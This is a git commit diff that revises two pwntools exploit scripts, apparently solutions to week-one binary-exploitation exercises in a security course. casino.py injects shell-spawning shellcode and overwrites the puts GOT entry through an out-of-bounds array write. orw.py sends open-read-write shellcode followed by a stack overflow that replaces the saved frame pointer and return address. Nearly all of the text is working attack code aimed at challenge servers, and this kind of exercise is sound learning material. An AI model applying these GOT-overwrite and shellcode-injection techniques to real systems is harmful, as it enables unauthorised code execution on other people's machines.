9f1bcb27f4b020796d1a1ff5c21a8c67cd0efb36
Slimlix Hsu <slime.creeper3@gmail.com>
2025-08-24 02:23:13 +0800

    fix exp on week1

--- week1/exp/casino.py
+++ week1/exp/casino.py
@@ -5,43 +5,38 @@ context.arch = 'amd64'
 
 # seed(0x30303030)
 
-"""
-shellcode = asm(
-    shellcraft.open('/home/orw/flag') +
-    shellcraft.read('rax', 'rsp', 0x40) +
-    shellcraft.write(1, 'rsp', 0x40)
-)
-"""
-
 shellcode = asm(
     shellcraft.sh()
 )
-conn = remote('localhost', 10172)
+conn = remote('192.168.122.129', 10172)
 
-target = [0, 0x6020f0 + 0x20] # puts@GOT to target
-puts_got_offset = -44 # relative to guess[]
+target = [0x6020f0 + 0x20, 0] # puts@GOT to target
+puts_got_offset = -43 # relative to guess[]
 payload = b'0' * 0x20 + shellcode # sets seed(0x30303030) and inject shellcode
 lottery_nums = [17, 54, 86, 73, 74, 70]
-lottery_nums = [a - 1 for a in lottery_nums] # off by one
 
-#with open('./input.data', 'wb') as f:
-#    f.write(payload)
-#print(f"[+] Payloads written to input.data")
+# send for binary, sendline for ascii
 
-conn.sendlineafter(b'name: ', payload)
+conn.sendafter(b'name: ', payload)
 conn.sendlineafter(b'age: ', b'100')
-for i in range(2):
-    print(f"Modifying guess[{puts_got_offset+i}]...")
-    for j in range(6):
-        sleep(0.2)
-        lottery_str = f'Chose the number {j}: '
-        print(f"{lottery_str} {lottery_nums[j]}")
-        conn.sendlineafter(lottery_str.encode(), str(lottery_nums[j] + i).encode()) # off by one first time, correct second time and calls puts, boom
-    conn.sendlineafter(b'Change the number? [1:yes 0:no]: ', b'1')
-    conn.sendlineafter(b'Which number [1 ~ 6]: ', str(puts_got_offset + i + 1).encode()) # Mofify GOT entry, +1 because they decrement it
-    got_str = f'Chose the number {puts_got_offset+i}: '
-    conn.sendlineafter(got_str.encode(), str(target[i]).encode()) # new address
-    print(f"  guess[{puts_got_offset+i}] modified to {hex(target[i])}")
+
+# first round
+for i in range(6):
+    sleep(0.1)
+    conn.sendlineafter(b': ', str(lottery_nums[i] - 1).encode()) # off by one 
+conn.sendlineafter(b']: ', b'1')
+conn.sendlineafter(b']: ', str(puts_got_offset).encode()) # Modify first half
+conn.sendlineafter(b':', str(target[0]).encode()) # new address
+print(f"[+] Round 1: guess[{puts_got_offset - 1}] modified to {hex(target[0])}")
+
+# second round 
+for i in range(6):
+    sleep(0.1)
+    conn.sendlineafter(b': ', str(lottery_nums[i]).encode()) # correct this time
+conn.sendlineafter(b']: ', b'1')
+conn.sendlineafter(b']: ', str(puts_got_offset + 1).encode()) # Modify second half
+conn.sendlineafter(b':', str(target[1]).encode())  
+print(f"[+] Round 2: guess[{puts_got_offset}] modified to {hex(target[1])}")
 
 conn.sendline(b'cat /home/$(whoami)/flag')
 conn.interactive()
--- week1/exp/orw.py
+++ week1/exp/orw.py
@@ -12,13 +12,13 @@ shellcode = asm(
     shellcraft.write(1, 'rsp', 0x40)
 )
 
-conn = remote('localhost', 10171)
+conn = remote('192.168.122.129', 10171)
 
 
 target = 0x6010a0
 old_rbp = 0x00007fffffffd960 # need to push to writable memory
-payload1 = shellcode.ljust(0x100, b'\x90') 
-payload2 = b'A' * 16 + p64(old_rbp) + p64(target)
+payload1 = shellcode.ljust(0x100, b'\x90') # pad so we can feed to gdb via redirect
+payload2 = b'A' * 0x10 + p64(old_rbp) + p64(target)
 
 with open('./input.data', 'wb') as f:
     f.write(payload1)
@@ -26,11 +26,11 @@ with open('./input.data', 'wb') as f:
 print(f"[+] Payloads written to input.data")
 
 print(f"Sending shell payload... {payload1} (len: {len(payload1)})")
-conn.sendlineafter(b'shellcode>', payload1)
+conn.sendafter(b'shellcode>', payload1) 
+# note that sendline will add \n and it will be read by next read() 
+# if you want to sendline, payload1 should be 0xff long instead.
 print(f"Sending target address... {payload2} (len: {len(payload2)})") 
 conn.sendlineafter(b':)', payload2)
-conn.sendline(b'cat /home/$(whoami)/flag')
 conn.interactive()
 
-# this doesn't work because bss is NX
 
